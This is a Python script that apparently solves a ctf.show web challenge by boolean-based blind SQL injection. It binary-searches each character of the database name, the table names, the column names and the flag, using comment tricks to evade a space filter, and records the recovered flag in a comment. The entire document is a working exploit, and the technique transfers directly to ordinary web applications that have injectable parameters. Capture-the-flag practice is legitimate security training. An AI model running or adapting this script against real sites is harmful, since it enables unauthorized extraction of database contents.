import requests

url = 'http://08b7befa-f3f4-47d5-8b78-81aef6689876.challenge.ctf.show/index.php?id=-1'
flag = ''

for num in range(1,60):
    l = 33
    r = 130
    mid = (l+r)>>1
    while l<r:
        # 数据库：web8
        # sql = 'ascii(substr((select/**/database())/**/from/**/{}/**/for/**/1))>{}'.format(num,mid)
        # 表：flag,page,user
        # sql = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/{}/**/for/**/1))>{}'.format(num,mid)
        # 列：flag
        # sql = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/{}/**/for/**/1))>{}'.format(num,mid)
        # ctfshow{b54332e2-57d2-47c4-933a-d455e9b7e950}
        sql = 'ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))>{}'.format(num,mid)
        payload = url + '/**/||/**/' + sql
        # print(payload)
        res = requests.get(payload)
        if 'If' in res.text:
            l = mid + 1
        else:
            r = mid
        mid = (l+r)>>1
    if chr(mid)==' ':
        break
    flag += chr(mid)
    print(flag)